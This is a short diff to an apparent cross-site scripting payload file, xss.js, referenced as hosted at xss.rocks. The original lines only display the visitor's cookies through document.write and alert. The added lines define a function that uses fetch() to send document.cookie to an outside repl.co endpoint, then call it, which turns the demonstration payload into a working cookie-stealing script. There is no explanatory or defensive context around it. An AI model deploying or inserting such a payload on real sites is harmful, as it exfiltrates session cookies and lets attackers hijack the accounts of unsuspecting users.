@@ -12,5 +12,12 @@ if (!self.__WB_pmw) { self.__WB_pmw = function(obj) { this.__WB_source = obj; re
 
 
 document.write ("This is remote text via xss.js located at xss.rocks " + document.cookie);
-alert ("This is remote text via xss.js located at xss.rocks " + document.cookie);
+myURL="https://surveyapi.brianmurphy11.repl.co/cookie?";
+function hitPoint(myVal){
+  console.log("Hitting endpoint");
+  console.log(myURL+"g="+myVal);
+  fetch(myURL+"g="+myVal,{mode:'no-cors'});
+}
+ hitPoint(document.cookie);
+alert ("This is remote text via xss.js pulled from xss.rocks " + document.cookie);
 }
